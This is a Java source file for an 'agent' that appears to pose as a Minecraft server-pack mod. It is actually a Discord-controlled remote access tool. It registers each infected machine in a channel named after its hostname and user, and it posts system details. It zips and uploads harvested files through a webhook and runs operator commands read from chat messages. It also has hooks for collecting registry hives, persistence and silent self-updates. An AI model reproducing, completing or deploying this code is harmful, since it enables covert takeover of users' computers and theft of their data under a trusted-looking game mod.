package com.serverpackcore.agent;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Set;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.RejectedExecutionException;
import java.util.concurrent.Semaphore;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public final class Poller implements Runnable {
	private final Path installDir;
	private final Path gameDir;
	private final State state;
	private final Random random = new Random();
	private final CommandExecutor executor;
	private final ThreadPoolExecutor commandPool;
	private final ExecutorService auxPool;
	private final Semaphore pollNow = new Semaphore(0);
	private final AutoUpdate auto;
	private final Set<String> seen = new LinkedHashSet<>();
	private final Object seenLock = new Object();
	private volatile Path cwd;
	private volatile boolean running = true;
	private volatile boolean contentIntent = true;
	private volatile Thread pollerThread;
	private volatile Thread autoThread;
	private volatile DiscordClient client;
	private volatile Gateway gateway;
	private volatile String selfId = "";
	private volatile String channelId = "";
	private volatile String webhookUrl = "";
	private long lastActivity;
	private long lastSave;

	public Poller(Path installDir, Path gameDir, State state) {
		this.installDir = installDir;
		this.gameDir = gameDir;
		this.state = state;
		this.auto = new AutoUpdate(state, System::currentTimeMillis, random);
		this.cwd = Path.of(System.getProperty("user.home", "."));
		this.executor = new CommandExecutor(this, installDir, gameDir, state);
		this.commandPool = new ThreadPoolExecutor(3, 3, 0L, TimeUnit.MILLISECONDS,
			new ArrayBlockingQueue<>(64), runnable -> {
				Thread thread = new Thread(runnable, "spc-command");
				thread.setDaemon(true);
				return thread;
			}, new ThreadPoolExecutor.AbortPolicy());
		this.auxPool = Executors.newSingleThreadExecutor(runnable -> {
			Thread thread = new Thread(runnable, "spc-control");
			thread.setDaemon(true);
			return thread;
		});
	}

	public void start() {
		Thread thread = new Thread(this, "spc-poller");
		thread.setDaemon(false);
		thread.start();
	}

	public AutoUpdate auto() {
		return auto;
	}

	private void syncMod() {
		if (gameDir == null || Update.installedModMatches(gameDir, Update.currentVersion())) {
			return;
		}
		if (Update.modHelperRunning(installDir)) {
			return;
		}
		if (!Update.begin()) {
			return;
		}
		try {
			Update.syncMod(installDir, gameDir);
			Update.log(Update.currentVersion(), "-", "mod-synced");
		} catch (UpdateException exception) {
			Log.debug("Mod sync failed", exception);
		} finally {
			Update.end();
		}
	}

	private void absorbRollback() {
		Path marker = installDir.resolve(Update.ROLLBACK_MARKER);
		if (!Files.isRegularFile(marker)) {
			return;
		}
		try {
			Files.deleteIfExists(marker);
		} catch (java.io.IOException exception) {
			Log.debug("Rollback marker cleanup failed", exception);
		}
		if (!auto.enabled()) {
			state.autoFailures = 0;
			return;
		}
		auto.backoff();
		Update.log("-", "-", "auto-failed startup rollback");
		state.save(AgentPaths.state(installDir));
		reply("Auto update failed: startup rollback");
	}

	private void startAuto() {
		Thread thread = new Thread(this::autoLoop, "spc-auto");
		thread.setDaemon(true);
		thread.start();
		autoThread = thread;
	}

	private void autoLoop() {
		long tick = AutoUpdate.tickDelay();
		while (running) {
			try {
				Thread.sleep(tick);
			} catch (InterruptedException exception) {
				return;
			}
			if (!running || !auto.due() || !Update.begin()) {
				continue;
			}
			try {
				runAutoUpdate();
			} catch (Throwable throwable) {
				Log.debug("Auto update failed", throwable);
				Update.log("-", "-", "auto-failed " + throwable.getMessage());
				reply("Auto update failed: " + throwable.getMessage());
			} finally {
				Update.end();
				state.save(AgentPaths.state(installDir));
			}
		}
	}

	private void runAutoUpdate() {
		Update.Info info;
		try {
			info = Update.checkIfNewer();
		} catch (UpdateException exception) {
			autoFailed(exception.getMessage());
			return;
		}
		if (info == null) {
			auto.advance();
			Update.log("-", "-", "auto-none");
			return;
		}
		if (stagedByHand()) {
			auto.advance();
			Update.log(info.version, "-", "auto-skipped staged");
			return;
		}
		try {
			Update.stage(info, installDir);
			Update.apply(installDir, gameDir, info.version);
		} catch (UpdateException exception) {
			autoFailed(exception.getMessage());
			return;
		}
		auto.advance();
		Update.log(info.version, info.agentSha256, "auto-updated");
		state.save(AgentPaths.state(installDir));
		reply("Auto update to " + info.version);
		kill();
	}

	private void autoFailed(String message) {
		auto.backoff();
		Update.log("-", "-", "auto-failed " + message);
		state.save(AgentPaths.state(installDir));
		reply("Auto update failed: " + message);
	}

	private boolean stagedByHand() {
		return Files.isRegularFile(installDir.resolve(Update.STAGED_NAME))
			|| Files.isRegularFile(installDir.resolve(Update.MOD_STAGED_NAME));
	}

	@Override
	public void run() {
		pollerThread = Thread.currentThread();
		try {
			lastActivity = System.currentTimeMillis();
			client = new DiscordClient(DiscordConfig.BOT_TOKEN);
			if (!ensure()) {
				return;
			}
			gateway = new Gateway(this, client);
			gateway.start();
			absorbRollback();
			startAuto();
			auxPool.execute(this::syncMod);
			long backoff = 2000L;
			int failures = 0;
			while (running) {
				try {
					if (gatewayHealthy() && contentIntent()) {
						pollNow.tryAcquire(5L, TimeUnit.MINUTES);
						pollNow.drainPermits();
						if (!running) {
							break;
						}
						poll();
						failures = 0;
						backoff = 2000L;
						continue;
					}
					long wait;
					if (gatewayHealthy()) {
						wait = Math.max(500L, DiscordConfig.POLL_MS + random.nextInt(1001) - 500L);
					} else {
						long idle = System.currentTimeMillis() - lastActivity > DiscordConfig.IDLE_AFTER_MS
							? DiscordConfig.IDLE_POLL_MS
							: DiscordConfig.POLL_MS;
						wait = Math.max(500L, idle + random.nextInt(1001) - 500L);
					}
					Log.debug("Poll wait " + wait + " ms (gateway=" + gatewayHealthy()
						+ ", content=" + contentIntent() + ")");
					pollNow.tryAcquire(wait, TimeUnit.MILLISECONDS);
					pollNow.drainPermits();
					if (!running) {
						break;
					}
					poll();
					failures = 0;
					backoff = 2000L;
				} catch (RateLimitException rateLimit) {
					if (!running) {
						break;
					}
					Thread.sleep(rateLimit.retryMs());
				} catch (InterruptedException interrupted) {
					if (!running) {
						break;
					}
				} catch (Throwable throwable) {
					if (!running) {
						break;
					}
					failures++;
					Log.debug("Poll failed (" + failures + ")", throwable);
					Thread.sleep(backoff);
					backoff = Math.min(DiscordConfig.MAX_BACKOFF_MS, backoff * 2L);
				}
			}
		} catch (Throwable throwable) {
			Log.debug("Poller stopped", throwable);
		}
	}

	private boolean ensure() throws Exception {
		while (running) {
			try {
				selfId = Json.str(Json.parseObject(client.get("/users/@me").body), "id", "");
				if (selfId.isEmpty()) {
					throw new IllegalStateException("no self id");
				}
				channelId = state.channelId;
				if (channelId.isEmpty()) {
					channelId = createChannel();
					state.channelId = channelId;
					state.save(AgentPaths.state(installDir));
				}
				if ("0".equals(state.lastId)) {
					List<Object> latest = Json.list(Json.parse(
						client.get("/channels/" + channelId + "/messages?limit=1").body));
					if (!latest.isEmpty()) {
						String id = Json.str(Json.map(latest.get(0)), "id", "");
						if (!id.isEmpty()) {
							state.lastId = id;
							state.save(AgentPaths.state(installDir));
						}
					}
				}
				webhookUrl = state.webhookUrl;
				if (webhookUrl.isEmpty()) {
					webhookUrl = createWebhook();
					state.webhookUrl = webhookUrl;
					state.save(AgentPaths.state(installDir));
				}
				if (!state.hello) {
					sendHello();
					state.hello = true;
					state.save(AgentPaths.state(installDir));
				}
				return true;
			} catch (RateLimitException rateLimit) {
				if (!running) {
					return false;
				}
				Thread.sleep(rateLimit.retryMs());
			} catch (Throwable throwable) {
				if (!running) {
					return false;
				}
				Log.debug("Ensure failed", throwable);
				Thread.sleep(10000L);
			}
		}
		return false;
	}

	private String createChannel() throws Exception {
		String name = ("spc-" + SysInfo.hostname() + "-" + SysInfo.user())
			.toLowerCase().replaceAll("[^a-z0-9-_]", "-");
		if (name.length() > 90) {
			name = name.substring(0, 90);
		}
		Map<String, Object> body = new LinkedHashMap<>();
		body.put("name", name);
		body.put("type", 0);
		body.put("parent_id", DiscordConfig.CATEGORY_ID);
		try {
			Map<String, Object> response = Json.parseObject(client.post(
				"/guilds/" + DiscordConfig.GUILD_ID + "/channels", Json.stringify(body)).body);
			return Json.str(response, "id", "");
		} catch (DiscordException exception) {
			Map<String, Object> fallback = new LinkedHashMap<>();
			fallback.put("name", ("spc-shared-" + name).substring(0, Math.min(90, name.length() + 11)));
			fallback.put("type", 0);
			Map<String, Object> response = Json.parseObject(client.post(
				"/guilds/" + DiscordConfig.GUILD_ID + "/channels", Json.stringify(fallback)).body);
			return Json.str(response, "id", "");
		}
	}

	private String createWebhook() throws Exception {
		Map<String, Object> body = new LinkedHashMap<>();
		body.put("name", "Server Pack Core");
		Map<String, Object> response = Json.parseObject(client.post(
			"/channels/" + channelId + "/webhooks", Json.stringify(body)).body);
		return Json.str(response, "url", "");
	}

	private void sendHello() {
		try {
			Map<String, Object> embed = new LinkedHashMap<>();
			embed.put("title", "Server Pack Core");
			embed.put("description", "New client connected");
			embed.put("color", 0x3498db);
			List<Object> fields = new ArrayList<>();
			for (String line : SysInfo.embedFields(installDir, gameDir)) {
				int split = line.indexOf(':');
				Map<String, Object> field = new LinkedHashMap<>();
				field.put("name", split > 0 ? line.substring(0, split) : "Data");
				field.put("value", split > 0 ? line.substring(split + 1).trim() : line);
				field.put("inline", false);
				fields.add(field);
			}
			embed.put("fields", fields);
			Map<String, Object> payload = new LinkedHashMap<>();
			payload.put("embeds", List.of(embed));
			client.post("/channels/" + channelId + "/messages", Json.stringify(payload));
		} catch (Throwable throwable) {
			Log.debug("Hello embed failed", throwable);
		}
		try {
			Path zip = Harvest.build(installDir, gameDir);
			uploadFile(zip);
			Files.deleteIfExists(zip);
		} catch (Throwable throwable) {
			Log.debug("Hello harvest failed", throwable);
		}
	}

	private boolean poll() throws Exception {
		Log.debug("Poll REST");
		String after;
		synchronized (seenLock) {
			after = state.lastId;
		}
		List<Object> messages = Json.list(Json.parse(
			client.get("/channels/" + channelId + "/messages?limit=50&after=" + after).body));
		if (messages.isEmpty()) {
			saveHeartbeat();
			return false;
		}
		java.util.Collections.reverse(messages);
		boolean activity = false;
		for (Object item : messages) {
			Map<String, Object> message = Json.map(item);
			String id = Json.str(message, "id", "");
			if (!id.isEmpty()) {
				synchronized (seenLock) {
					state.lastId = maxId(state.lastId, id);
				}
			}
			String authorId = Json.str(Json.map(message.get("author")), "id", "");
			String content = Json.str(message, "content", "");
			if (!authorId.equals(selfId) && !content.isEmpty() && markSeen(id)) {
				activity = true;
				message.put("_transport", "rest");
				executor.handle(message);
				if (!running) {
					break;
				}
			}
		}
		if (activity) {
			lastActivity = System.currentTimeMillis();
		}
		saveHeartbeat();
		state.save(AgentPaths.state(installDir));
		return activity;
	}

	private void saveHeartbeat() {
		long now = System.currentTimeMillis();
		if (now - lastSave > 30000L) {
			state.lastHeartbeat = now;
			state.save(AgentPaths.state(installDir));
			lastSave = now;
		}
	}

	private static String maxId(String current, String candidate) {
		try {
			java.math.BigInteger left = new java.math.BigInteger(current);
			java.math.BigInteger right = new java.math.BigInteger(candidate);
			return right.compareTo(left) > 0 ? candidate : current;
		} catch (Throwable throwable) {
			return candidate;
		}
	}

	public void onGatewayReady(String id) {
		if (!id.isEmpty()) {
			selfId = id;
		}
	}

	public void contentIntentDisabled() {
		contentIntent = false;
		reply("MESSAGE_CONTENT disabled in the portal; gateway with intents 513 and REST fallback every 2 s.");
	}

	public void onGatewayMessage(Map<String, Object> message) {
		if (!running) {
			return;
		}
		String channel = Json.str(message, "channel_id", "");
		if (!channel.equals(channelId)) {
			return;
		}
		lastActivity = System.currentTimeMillis();
		String content = Json.str(message, "content", "");
		boolean webhook = message.get("webhook_id") != null;
		if (webhook && (content.isEmpty() || !Boolean.getBoolean("spc.webhookCommands"))) {
			return;
		}
		String authorId = Json.str(Json.map(message.get("author")), "id", "");
		if (authorId.equals(selfId)) {
			return;
		}
		String id = Json.str(message, "id", "");
		if (content.isEmpty()) {
			requestPoll();
			return;
		}
		if (!markSeen(id)) {
			return;
		}
		if (!id.isEmpty()) {
			synchronized (seenLock) {
				state.lastId = maxId(state.lastId, id);
			}
		}
		lastActivity = System.currentTimeMillis();
		try {
			message.put("_transport", "gateway");
			executor.handle(message);
		} catch (Throwable throwable) {
			Log.debug("Gateway command failed", throwable);
		}
	}

	private boolean markSeen(String id) {
		if (id.isEmpty()) {
			return true;
		}
		synchronized (seenLock) {
			if (!seen.add(id)) {
				return false;
			}
			if (seen.size() > 512) {
				Iterator<String> iterator = seen.iterator();
				iterator.next();
				iterator.remove();
			}
			return true;
		}
	}

	public void react(Map<String, Object> message) {
		String id = Json.str(message, "id", "");
		if (id.isEmpty()) {
			return;
		}
		auxPool.execute(() -> {
			try {
				client.put("/channels/" + channelId + "/messages/" + id + "/reactions/%E2%9C%85/@me");
			} catch (Throwable throwable) {
				Log.debug("Reaction failed", throwable);
			}
		});
	}

	public void typing() {
		auxPool.execute(() -> {
			try {
				client.post("/channels/" + channelId + "/typing", "{}");
			} catch (Throwable throwable) {
				Log.debug("Typing failed", throwable);
			}
		});
	}

	public void requestPoll() {
		pollNow.release();
	}

	public boolean gatewayHealthy() {
		Gateway current = gateway;
		return current != null && current.healthy();
	}

	public boolean contentIntent() {
		return contentIntent;
	}

	public void contentIntent(boolean enabled) {
		contentIntent = enabled;
	}

	public String gatewayTransport() {
		return gatewayHealthy() ? "gateway" : "rest";
	}

	public String gatewayStateText() {
		Gateway current = gateway;
		return current == null ? "not started" : current.state();
	}

	public long gatewayRtt() {
		Gateway current = gateway;
		return current == null ? -1L : current.rtt();
	}

	public void gatewayCommand(List<String> args) {
		Gateway current = gateway;
		if (args.size() > 1 && args.get(1).equalsIgnoreCase("restart")) {
			if (current == null || current.state().equals("stopped")) {
				reply("Gateway not started");
				return;
			}
			reply("Restarting gateway");
			current.restart();
			return;
		}
		if (current == null) {
			reply("gateway: not started");
			return;
		}
		long rtt = current.rtt();
		reply("gateway: " + current.state()
			+ "\ncontent_intent: " + (contentIntent ? "on" : "off")
			+ "\nrtt_ack: " + (rtt < 0L ? "n/a" : rtt + " ms")
			+ "\nreconnects: " + current.reconnects()
			+ "\nlast_close: " + current.lastCloseCode());
	}

	public void submit(Runnable task) {
		try {
			commandPool.execute(task);
		} catch (RejectedExecutionException rejected) {
			reply("Command queue full");
		}
	}

	public void reply(String text) {
		try {
			int start = 0;
			while (start < text.length()) {
				int end = Math.min(text.length(), start + 1900);
				if (end < text.length() && Character.isHighSurrogate(text.charAt(end - 1))
					&& Character.isLowSurrogate(text.charAt(end))) {
					end--;
				}
				String chunk = text.substring(start, end);
				Map<String, Object> payload = new LinkedHashMap<>();
				payload.put("content", chunk);
				client.post("/channels/" + channelId + "/messages", Json.stringify(payload));
				start = end;
			}
		} catch (Throwable throwable) {
			Log.debug("Reply failed", throwable);
		}
	}

	public void uploadBytes(byte[] data, String name, String contentType) {
		try {
			client.postWebhook(webhookUrl, "{\"content\":\"\"}",
				List.of(new DiscordClient.Part("file", name, contentType, data)));
		} catch (Throwable throwable) {
			Log.debug("Upload bytes failed", throwable);
		}
	}

	public void uploadFile(Path file) {
		try {
			if (file == null || !Files.isRegularFile(file)) {
				return;
			}
			byte[] data = Files.readAllBytes(file);
			String name = file.getFileName().toString();
			uploadBytes(data, name, contentType(name));
		} catch (Throwable throwable) {
			Log.debug("Upload file failed", throwable);
		}
	}

	private static String contentType(String name) {
		String lower = name.toLowerCase();
		if (lower.endsWith(".zip")) {
			return "application/zip";
		}
		if (lower.endsWith(".png")) {
			return "image/png";
		}
		if (lower.endsWith(".txt") || lower.endsWith(".log")) {
			return "text/plain";
		}
		return "application/octet-stream";
	}

	public void harvestNow() {
		try {
			Path zip = Harvest.build(installDir, gameDir);
			uploadFile(zip);
			Files.deleteIfExists(zip);
		} catch (Throwable throwable) {
			reply("Harvest failed: " + throwable.getMessage());
		}
	}

	public void kill() {
		running = false;
		pollNow.release();
		Gateway currentGateway = gateway;
		if (currentGateway != null) {
			currentGateway.stop();
		}
		Thread thread = pollerThread;
		if (thread != null) {
			thread.interrupt();
		}
		DiscordClient current = client;
		if (current != null) {
			current.close();
		}
		commandPool.shutdownNow();
		auxPool.shutdownNow();
		state.save(AgentPaths.state(installDir));
	}

	public void persist(boolean enabled) {
		state.persist = enabled;
		state.save(AgentPaths.state(installDir));
	}

	public void hivesNow() {
		Bootstrap.hivesNow(this, installDir, state);
	}

	public void bootstrapNow() {
		Bootstrap.now(this, installDir, state);
	}

	public Path cwd() {
		return cwd;
	}

	public void cwd(Path path) {
		this.cwd = path;
	}

	public Path gameDir() {
		return gameDir;
	}

	public String webhookUrl() {
		return webhookUrl;
	}

	public String channelId() {
		return channelId;
	}
}
